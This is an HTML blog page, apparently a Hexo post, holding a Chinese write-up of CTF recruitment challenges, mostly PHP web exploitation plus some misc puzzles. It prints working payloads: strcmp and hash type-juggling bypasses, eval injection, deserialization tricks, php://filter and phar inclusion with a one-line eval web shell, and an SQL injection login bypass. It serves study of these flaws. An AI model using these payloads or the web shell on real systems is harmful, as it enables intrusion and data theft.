@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Aegis recruit WriteUp | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="Web1.Adventures in PHP (0) 作为招新题的第一题，自然难度不大，点击连接可以看到PHP源代码：   我们可以看到代码中包含了flag1.php文件，从下方代码中推测$flag变量在这个文件中声明。阅读代码发现，其获取了通过get方法传上来的键为flag的值。如果这个值未被设置，就打印出源代码。紧接着通过strcmp()函数判断该值与已经设置的$flag变量是否相同，若相同则">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Aegis recruit WriteUp">
+<meta property="og:url" content="http://example.com/2019/10/09/aegis-recruit-writeup/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Web1.Adventures in PHP (0) 作为招新题的第一题，自然难度不大，点击连接可以看到PHP源代码：   我们可以看到代码中包含了flag1.php文件，从下方代码中推测$flag变量在这个文件中声明。阅读代码发现，其获取了通过get方法传上来的键为flag的值。如果这个值未被设置，就打印出源代码。紧接着通过strcmp()函数判断该值与已经设置的$flag变量是否相同，若相同则">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/10/497_1.png">
+<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/10/499_1.png">
+<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/10/501_1.png">
+<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/10/503_1-1024x57.png">
+<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/10/505_1.png">
+<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/10/507_1-1024x189.png">
+<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/10/515_1.png">
+<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/10/517_1.png">
+<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/10/519_1.png">
+<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/10/521_1-1.png">
+<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/10/523_1.png">
+<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/10/527_1.png">
+<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/10/529_1-1024x301.png">
+<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/10/531_1.png">
+<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/10/533_1.png">
+<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/10/623_1-1024x433.png">
+<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/10/625_1.png">
+<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/10/627_1.png">
+<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/10/535_1.png">
+<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/10/537_1.png">
+<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/10/539_1-1024x491.png">
+<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/10/541_1-1024x659.png">
+<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/10/543_1.png">
+<meta property="article:published_time" content="2019-10-09T13:21:21.000Z">
+<meta property="article:modified_time" content="2021-05-29T15:36:51.460Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://106.54.80.67/wp-content/uploads/2019/10/497_1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-aegis-recruit-writeup" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/10/09/aegis-recruit-writeup/" class="article-date">
+  <time class="dt-published" datetime="2019-10-09T13:21:21.000Z" itemprop="datePublished">2019-10-09</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/WriteUp-in-platform/">WriteUp in platform</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Aegis recruit WriteUp
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-Adventures-in-PHP-0"><a href="#1-Adventures-in-PHP-0" class="headerlink" title="1.Adventures in PHP (0)"></a>1.Adventures in PHP (0)</h3><p><img src="http://106.54.80.67/wp-content/uploads/2019/10/497_1.png"></p>
+<p>作为招新题的第一题，自然难度不大，点击连接可以看到PHP源代码：</p>
+<?php 
+error\_reporting(0); 
+include('flag1.php'); 
+if (!isset($\_GET\['flag'\])){ 
+    show\_source(\_\_FILE\_\_); 
+    exit(); 
+} 
+if (strcmp($\_GET\['flag'\], $flag) == 0) { 
+echo "success, flag:" . $flag; 
+} ?>
+
+<p>我们可以看到代码中包含了flag1.php文件，从下方代码中推测$flag变量在这个文件中声明。阅读代码发现，其获取了通过get方法传上来的键为flag的值。如果这个值未被设置，就打印出源代码。紧接着通过strcmp()函数判断该值与已经设置的$flag变量是否相同，若相同则输出$flag的值。经过搜索资料，注意到PHP中的<strong>strcmp语句有漏洞，即当比较的两个变量中有一个不是字符串类型时，函数就会出现错误而返回0</strong>.但是程序在get到的变量为整型时，会将其解释为字符串，于是想到令该值为数组或对象即可绕过判断。于是构造:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95.179.228.15:8000&#x2F;?flag[]&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>得到flag:</p>
+<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/499_1.png"></p>
+<h3 id="2-Adventures-in-PHP-1"><a href="#2-Adventures-in-PHP-1" class="headerlink" title="2.Adventures in PHP (1)"></a>2.Adventures in PHP (1)</h3><p><img src="http://106.54.80.67/wp-content/uploads/2019/10/501_1.png"></p>
+<p>同样进入链接就给出了源代码：</p>
+<?php
+$array1 = array("a"=>"apple","b"=>"ban");
+$array2 = array("a","b","c");
+var\_dump($array1);
+var\_dump($array2);
+?>
+
+<p>则输出</p>
+<p>array(2) {<br>  [“a”]=&gt;<br>  string(5) “apple”<br>  [“b”]=&gt;<br>  string(3) “ban”<br>}<br>array(3) {<br>  [0]=&gt;<br>  string(1) “a”<br>  [1]=&gt;<br>  string(1) “b”<br>  [2]=&gt;<br>  string(1) “c”<br>}</p>
+<p>在这里我们注意到$args前还有一个$符号，于是可以利用全局变量GLOBALS。$GLOBALS可引用全局作用域中的全部变量，键为变量的名称，值即为变量的值，于是构造payload，输出所有变量的值:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95.179.228.15:8001&#x2F;?args&#x3D;GLOBALS</span><br></pre></td></tr></table></figure>
+
+<p>得到flag:</p>
+<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/503_1-1024x57.png"></p>
+<p><strong>Ps</strong>:在复现这个问题时，发现eval()函数的一个问题，如下代码</p>
+<?php
+$array1 = array("a"=>"apple","b"=>"ban"); 
+$array2 = array("a","b","c");
+$args = "array1";
+var\_dump($array1);
+var\_dump($$args);
+eval("var\_dump(\\$array1);");(1)
+eval("var\_dump(\\$$args);"); (2)
+?>
+
+<p>实际运行时发现，(1)语句如果没有转义符，会导致解析失败，而(2)中如没有转义符，也不会出现问题。</p>
+<h3 id="3-Is-everything-injectable"><a href="#3-Is-everything-injectable" class="headerlink" title="3.Is everything injectable?"></a>3.Is everything injectable?</h3><p><img src="http://106.54.80.67/wp-content/uploads/2019/10/505_1.png"></p>
+<p>这道题有两个小问，我们一一来看。第一问：</p>
+<p>flag 在变量里! &lt;?php  <br>error_reporting(0);<br>include “flag1.php”;<br>highlight_file(__file__);<br>if(isset($_GET[‘args’])){<br>    $args = $_GET[‘args’];<br>    if(!preg_match(“/^\w+$/“,$args)){<br>        die(“args error!”);<br>    }<br>    eval(“var_dump($$args);”);<br>}</p>
+<p>与第二题的方法完全一样，构造payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95.179.228.15:8005&#x2F;index1.php?args&#x3D;GLOBALS</span><br></pre></td></tr></table></figure>
+
+<p>得到flag:</p>
+<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/507_1-1024x189.png"></p>
+<p>第二问：</p>
+<?php  
+include "flag2.php"; 
+error\_reporting(0); 
+show\_source(\_\_FILE\_\_); 
+$a = @$\_REQUEST\['hello'\]; 
+eval("var\_dump($a);");
+>
+
+想到采用之前的方法来构造payload:
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95.179.228.15:8005&#x2F;index2.php?hello&#x3D;$GLOBALS</span><br></pre></td></tr></table></figure>
+
+得到
+
+![](http://106.54.80.67/wp-content/uploads/2019/10/509_1-1024x147.png)
+
+  
+并没有flag，可以推测flag在文件flag2.php中，因此不包含在$GLOBALS数组中。于是又想到通过闭合var\_dump()函数。但是用什么样的语句来探测flag2.php中的内容呢？经过学习，得知**php中的file()函数可以将一个文件中的内容作为数组输出，每一行的内容作为一个数组的一个单元**。又php中echo不能输出数组的内容，所以通过print\_r()函数来输出，于是构造payload:
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95.179.228.15:8005&#x2F;index2.php?hello&#x3D;);print_r(file(&quot;flag2.php&quot;)</span><br></pre></td></tr></table></figure>
+
+得到flag:
+
+![](http://106.54.80.67/wp-content/uploads/2019/10/511_1-1024x65.png)
+
+### 4.Adventures in PHP (2)
+
+![](http://106.54.80.67/wp-content/uploads/2019/10/513_1.png)
+
+这题大概是所有题中卡住时间最长的了，尤其是在最后一个分支，代码如下：
+
+<?php include 'fl4g.php'; error\_reporting(0); 
+if($\_REQUEST\['mode'\]!="begin"){ 
+    show\_source(\_\_FILE\_\_); 
+    die("PHP Games!"); 
+}else{ 
+    class last\_task{ 
+        var $left; 
+        var $middle; 
+        var $right; 
+    } 
+    $a=$\_GET\['a'\]; 
+    $b=$\_GET\['b'\]; 
+    if($a==$b){ 
+        die("wrong way"); 
+    }else{ 
+        if(md5($a)!=sha1($b)){ 
+            die("need a little magic"); 
+        }else{ 
+            if($\_POST\['token'\]){ 
+                $token = unserialize($\_POST\['token'\]); 
+                if($token\['user'\]=="user"&&$token\['pass'\]=="pass"){ 
+                        $flag=$\_POST\['flag'\]; 
+                        if($flag){ 
+                            $flag = unserialize(urldecode($flag)); 
+                            $flag->middle = $fl4g; 
+                            if($flag->middle===$flag->left&&$flag->middle===$flag->right){ 
+                                echo "this is your flag ".$flag->middle; 
+                            }else{ 
+                                die("one more step"); 
+                            } 
+                        }else{ 
+                            die("don't give up"); 
+                        } 
+                }else{ 
+                    die("Not a valid token"); 
+                } 
+            }else{ 
+                die("give me the token"); 
+            } 
+        } 
+    } 
+} ?><p> </p>
+<p>这段代码共有六个判断，只有每一个分支都正确通过才能得到flag。首先设置mode参数的值为”begin”。第一个问题要求$a与$b参数的值不相等但是要求md5与sha1的哈希值相等。我们知道评价哈希算法好坏一个重要因素就是碰撞的概率，而md5和sha1这样成熟的哈希算法碰撞的可能性自然不高。但经过查找，发现<strong>md5或sha1加密后，如果开头为0e，则该值会被视为科学记数法，即0的若干次方。但0的任意次方都为0，所以在比较时可能会出现问题</strong>。于是查找可以使用的相关数据，得到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a &#x2F;&#x2F;md5</span><br><span class="line"></span><br><span class="line">sha1(&#39;aaroZmOk&#39;)  </span><br><span class="line">sha1(&#39;aaK1STfY&#39;)</span><br><span class="line">sha1(&#39;aaO8zKZF&#39;)</span><br><span class="line">sha1(&#39;aa3OFF9m&#39;) &#x2F;&#x2F;sha1</span><br></pre></td></tr></table></figure>
+
+<p>于是构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95.179.228.15:8004&#x2F;?a&#x3D;s214587387a&amp;b&#x3D;aa3OFF9m&amp;mode&#x3D;begin</span><br></pre></td></tr></table></figure>
+
+<p>可绕过该判断<br>不仅如此，php中md5()函数与sha1()函数都有着无法处理数组的漏洞，一旦输入数组都会返回FALSE，满足判断条件，因此也可构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95.179.228.15:8004&#x2F;?a[]&#x3D;[]&amp;b[]&#x3D;[1]&amp;mode&#x3D;begin</span><br></pre></td></tr></table></figure>
+
+<p>通过该判断后，接下来的代码提交参数采用的是post方法，无法通过构造url直接提交，于是采用Python的requests库提交post参数。阅读代码可知，接下来的判断为提交的的token参数的反序列化，这里涉及到了反序列化函数unserialize()，该函数是序列化函数serialize()的逆过程，<strong>序列化将一个数组或对象变为一个表示该数组或对象信息的字符串，而反序列化则是将字符串还原为字符或数组</strong>。序列化后的格式大致如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:1:&quot;a&quot;;s:4:&quot;user&quot;;s:1:&quot;b&quot;;s:4:&quot;pass&quot;;&#125;</span><br><span class="line"></span><br><span class="line">&#39;O:9:&quot;last_task&quot;:3:&#123;s:4:&quot;left&quot;;s:1:&quot;a&quot;;s:6:&quot;middle&quot;;s:2:&quot;hh&quot;;s:5:&quot;right&quot;;s:3:&quot;hhh&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从中可以读出数组的元素类型，名称，长度，对象的成员类型和值等信息。所以通过user与pass的判断只需构造键值对：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;token&#39;: &#39;a:2:&#123;s:4:&quot;user&quot;;s:4:&quot;user&quot;;s:4:&quot;pass&quot;;s:4:&quot;pass&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>最后一个分支判断中，代码将$f14g的值赋给了flag-&gt;middle，紧接着判断middle与right，left的值是否相同，但是我们目前无法得知$f14g的值，也就无法构造满足题意的反序列化字符串。但根据提示“引用”，查询与引用和反序列化相关的知识，得知<strong>反序列化字符串中可以包含某个变量的引用</strong>。于是在该题中，我们就可以利用引用变量达到三个变量一起变化的目的。以此编写Python代码如下：</p>
+<p>import requests<br>url = “<a target="_blank" rel="noopener" href="http://95.179.228.15:8004/?a%5C%5B%5C%5D=$GLOBALS&amp;b%5C%5B%5C%5D=%5C%5B2%5C%5D&amp;mode=begin&quot;">http://95.179.228.15:8004/?a\[\]=$GLOBALS&amp;b\[\]=\[2\]&amp;mode=begin&quot;</a><br>params = {‘token’: ‘a:2:{s:4:”user”;s:4:”user”;s:4:”pass”;s:4:”pass”;}’,         <br>               “flag”: ‘O:9:”last_task”:3:{s:4:”left”;s:1:”a”;s:6:”middle”;R:2;s:5:”right”;R:2;}’}</p>
+<p> if __name__ == “__main__“:   <br> r = requests.post(url,data = params)   <br> print(r.text)</p>
+<p>运行得到flag：</p>
+<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/515_1.png"></p>
+<h3 id="5-Adventures-in-PHP-3"><a href="#5-Adventures-in-PHP-3" class="headerlink" title="5.Adventures in PHP (3)"></a>5.Adventures in PHP (3)</h3><p><img src="http://106.54.80.67/wp-content/uploads/2019/10/517_1.png"></p>
+<p>点击链接看到源码：</p>
+<?php   
+error\_reporting(0); 
+include("flag3.php"); 
+class Flag{  
+    public $file;   
+    public function \_\_tostring(){   
+        if(isset($this->file)){   
+            echo file\_get\_contents($this->file);  
+            echo "<br>"; 
+            return ("good"); 
+        }   
+    }   
+} 
+$txt = $\_GET\["txt"\]; 
+$password = $\_GET\["password"\];   
+if(!isset($txt)){ 
+    show\_source(\_\_FILE\_\_); 
+    exit(); 
+} 
+if(file\_get\_contents($txt,'r')==="welcome to the aegis"){   
+    echo "hello friend!<br>";     
+    $password = unserialize($password);   
+    echo $password;   
+}else{   
+    echo "something wrong! try it again";   
+} 
+   ?>
+
+<p>这里遇到了函数file_get_contents(),该函数把文件的内容读到一个字符串中。但是此处没有上传文件的方法，应该如何输入指定的字符串呢？这里我们了解到php的一个伪协议<strong>php://input可以访问请求中的原始数据流，即我们可以认为php://input为文件名，而随请求传入的参数即为文件内容</strong>，由此方法可以通过该判断。紧接着又出现了反序列化函数，通过编写php代码容易构造符合题意的反序列化字符串：</p>
+<?php
+class Flag{  
+    public $file;   
+    public function \_\_tostring(){   
+        if(isset($this->file)){   
+            echo file\_get\_contents($this->file);  
+            echo "<br>"; 
+            return ("good"); 
+        }   
+    }   
+} 
+$a = new Flag();
+$a->file = "flag3.php";
+$str = serialize($a);
+echo $str;
+?>
+
+<p>于是编写Python代码：</p>
+<p>import requests<br>url = ‘<a target="_blank" rel="noopener" href="http://95.179.228.15:8002/?txt=php://input&amp;password=O:4:&quot;Flag&quot;:1:%7Bs:4:&quot;file&quot;;s:9:&quot;flag3.php&quot;;%7D&#39;">http://95.179.228.15:8002/?txt=php://input&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:9:&quot;flag3.php&quot;;}&#39;</a><br>params = “welcome to the aegis”</p>
+<p>if __name__ == “__main__“:   <br>r = requests.post(url,data = params)   <br>print(r.text)</p>
+<p>得到flag:</p>
+<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/519_1.png"></p>
+<h3 id="6-不能getshell还日什么站？嗯？"><a href="#6-不能getshell还日什么站？嗯？" class="headerlink" title="6.不能getshell还日什么站？嗯？"></a>6.不能getshell还日什么站？嗯？</h3><p><img src="http://106.54.80.67/wp-content/uploads/2019/10/521_1-1.png"></p>
+<p>为数不多不是直接给出源代码的题目，进入链接得到：</p>
+<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/523_1.png"></p>
+<p>尝试上传文件后发现不允许上传php文件，只能上传图片，但上传后会给出存储的路径。查看网页源代码：  </p>
+<p>发现有include.php的文件，于是尝试<strong>使用php://filter伪协议得到源码</strong>，尝试构造payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95.179.228.15:8006&#x2F;include.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;include.php</span><br></pre></td></tr></table></figure>
+
+<p>发现可行，得到include.php的base64编码字符串，解密后得到include.php：</p>
+<html>
+Tips: the parameter is file! :) 
+<!-- upload.php -->
+</html>
+<?php
+    error\_reporting(0);
+    @$file = $\_GET\["file"\];
+    if(isset($file))
+    {
+        if (preg\_match('/httpdataftpinput%00/i', $file)  strstr($file,"..") !== FALSE  strlen($file)>=70)
+        {
+            echo "<p> error! </p>";
+        }
+        else
+        {
+            include($file.'.php');
+        }
+    }
+?>
+
+<p>阅读源码，发现正则匹配参数$file中不能包括有http,data,ftp,input，%00，..等字符串，并且文件长度不得大于70。因此一些用长度来截断的方法便不能使用。通过判断后，程序将以$file为文件名的php文件包含。参考提示中的phar，我们了解到<strong>phar协议是一种归档格式，通过该协议也能达到文件包含的目的</strong>。于是我们建立文件，将其命名为new.php，写入<strong>一句话木马</strong>和测试是否包含成功的phpinfo:</p>
+<?php @eval($\_P0/\*备份文件报毒\*/ST\['pass'\]); echo phpinfo();?>
+
+<p>将其打包为new.zip，再将后缀改为jpg，上传到服务器。上传成功后可以看到路径：</p>
+<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/527_1.png"></p>
+<p>构造payload包含该文件:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95.179.228.15:8006&#x2F;include.php?file&#x3D;phar:&#x2F;&#x2F;upload&#x2F;new.jpg&#x2F;new件:</span><br></pre></td></tr></table></figure>
+
+<p>发现包含成功：</p>
+<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/529_1-1024x301.png"></p>
+<p>尝试使用中国菜刀连接，不知为何连接不上，于是直接使用Python来发出相关命令：</p>
+<p>import requests<br>url = ‘<a target="_blank" rel="noopener" href="http://95.179.228.15:8006/include.php?file=phar://upload/new.jpg/new&#39;">http://95.179.228.15:8006/include.php?file=phar://upload/new.jpg/new&#39;</a><br>params = {“pass”:”system(ls);”}<br>if __name__ == “__main__“:   <br>    r = requests.post(url,data = params)   <br>    print(r.text)</p>
+<p>得到文件目录列表</p>
+<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/531_1.png"></p>
+<p>进入<a href="mailto:&#102;&#x31;&#x6c;&#x31;&#108;&#x31;&#64;&#103;&#x2e;&#116;&#x78;&#x74;">&#102;&#x31;&#x6c;&#x31;&#108;&#x31;&#64;&#103;&#x2e;&#116;&#x78;&#x74;</a>，得到flag：</p>
+<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/533_1.png"></p>
+<h3 id="7-sqli"><a href="#7-sqli" class="headerlink" title="7.sqli"></a>7.sqli</h3><p>这是一道当时没有做出来的题目，通过源码和wsl+apache2+php+mysql搭建环境：</p>
+<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/623_1-1024x433.png"></p>
+<p>在源码的config.php中更改了密码以顺利连接数据库，在index.php中让执行的sql语句输出以便于阅读。阅读源码发现其中使用正则过滤了这些字符：</p>
+<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/625_1.png"></p>
+<p>可以看到其中没有单引号于是可以采用万能用户名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+
+<p>但是发现不能成功，查询语句为：</p>
+<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/627_1.png"></p>
+<p>因为第一个条件不能满足，所以即使第二个为真，与上第三个表达式后依然为假，所以只要使username为真，就可利用逻辑短路跳过其他判断，所以使用用户名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+
+<p>就能得到flag。<br>对sql的不熟悉和对注入的了解很少是这道题没做出来的原因。</p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="1-真·签到题"><a href="#1-真·签到题" class="headerlink" title="1.真·签到题"></a>1.真·签到题</h3><p><img src="http://106.54.80.67/wp-content/uploads/2019/10/535_1.png"></p>
+<p>确实是真签到题，不过也是人生中的第一道CTF题</p>
+<h3 id="2-抠脑壳"><a href="#2-抠脑壳" class="headerlink" title="2.抠脑壳"></a>2.抠脑壳</h3><p><img src="http://106.54.80.67/wp-content/uploads/2019/10/537_1.png"></p>
+<p>我们将文件下载，得到压缩包encrypt.zip,解压后得到一个无法打开的文件encrypt.exe。尝试使用记事本打开，发现可行，得到：</p>
+<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/539_1-1024x491.png"></p>
+<p>由开头的字符怀疑为网址，输入浏览器地址栏得到：</p>
+<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/541_1-1024x659.png"></p>
+<p>扫码后得到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(function(p,a,c,k,e,d)&#123;e&#x3D;function(c)&#123;return(c&lt;a?&quot;&quot;:e(parseInt(c&#x2F;a)))+((c&#x3D;c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!&#39;&#39;.replace(&#x2F;^&#x2F;,String))&#123;while(c--)d[e(c)]&#x3D;k[c]e(c);k&#x3D;[function(e)&#123;return d[e]&#125;];e&#x3D;function()&#123;return&#39;\\w+&#39;&#125;;c&#x3D;1;&#125;;while(c--)if(k[c])p&#x3D;p.replace(new RegExp(&#39;\\b&#39;+e(c)+&#39;\\b&#39;,&#39;g&#39;),k[c]);return p;&#125;(&#39;7 5&#x3D;\&#39;\&#39;7 8&#x3D;\&#39;\&#39;;g(7 4&#x3D;0,9&#x3D;5.a,1,3;4&lt;9;++4)&#123;1&#x3D;5.c(4);b(1&lt;6)1+&#x3D;6;d 1-&#x3D;6;1&#x3D;f-1;3&#x3D;1.h(e);b(3.a&lt;2)3&#x3D;\&#39;0\&#39;+3;8+&#x3D;3&#125;&#39;,18,18,&#39;charCodehexCodexflag128varcipherylengthifcharCodeAtelse16255fortoString&#39;.split(&#39;&#39;),0,&#123;&#125;))</span><br></pre></td></tr></table></figure>
+
+<p>经搜索，发现为格式化JS代码，使用搜索得到的解密网页：</p>
+<script> 
+a=62; 
+function encode() { 
+ var code = document.getElementById('code').value; 
+ code = code.replace(/\[\\r\\n\]+/g, ''); 
+ code = code.replace(/'/g, "\\\\'"); 
+ var tmp = code.match(/\\b(\\w+)\\b/g); 
+ tmp.sort(); 
+ var dict = \[\]; 
+ var i, t = ''; 
+ for(var i=0; i<tmp.length; i++) { 
+   if(tmp\[i\] != t) dict.push(t = tmp\[i\]); 
+ } 
+ var len = dict.length; 
+ var ch; 
+ for(i=0; i<len; i++) { 
+   ch = num(i); 
+   code = code.replace(new RegExp('\\\\b'+dict\[i\]+'\\\\b','g'), ch); 
+   if(ch == dict\[i\]) dict\[i\] = ''; 
+ } 
+ document.getElementById('new\_code').value = "eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d\[e(c)\]=k\[c\]e(c);k=\[function(e){return d\[e\]}\];e=function(){return'\\\\\\\\w+'};c=1};while(c--)if(k\[c\])p=p.replace(new RegExp('\\\\\\\\b'+e(c)+'\\\\\\\\b','g'),k\[c\]);return p}(" 
+   + "'"+code+"',"+a+","+len+",'"+ dict.join('')+"'.split(''),0,{}))"; 
+} 
+
+function num(c) { 
+ return(c<a?'':num(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36)); 
+} 
+
+function run() { 
+ eval(document.getElementById('code').value); 
+} 
+
+function decode() { 
+ var code = document.getElementById('code').value; 
+ code = code.replace(/^eval/, ''); 
+ document.getElementById('new\_code').value = eval(code); 
+} 
+</script> 
+
+<div>JS文件加密解密</div>
+<div>原脚本</div>
+<textarea id="code" cols=80 rows=10> 
+</textarea>
+<div>加密/解密后脚本</div>
+<textarea id="new\_code" cols=80 rows=10> 
+
+</textarea>
+ <div>
+<input type=button onclick=encode() value=编码> 
+<input type=button onclick=run() value=执行> 
+<input type=button onclick=decode() value=解码> 
+</div>
+
+<p>得到：</p>
+<p>var flag=’’；<br>var cipher=’’;<br>for(var x=0,y=flag.length,charCode,hexCode;x&lt;y;++x)<br>{<br>charCode=flag.charCodeAt(x);<br>if(charCode&lt;128)<br>charCode+=128;<br>else charCode-=128;<br>charCode=255-charCode;<br>hexCode=charCode.toString(16);<br>if(hexCode.length&lt;2)hexCode=’0’+hexCode;<br>cipher+=hexCode}</p>
+<p>阅读源码发现该程序为加密算法，反向编写解密算法：</p>
+<p>s = ‘1c4f11460d3e0b0a134b2b1630114a5e’</p>
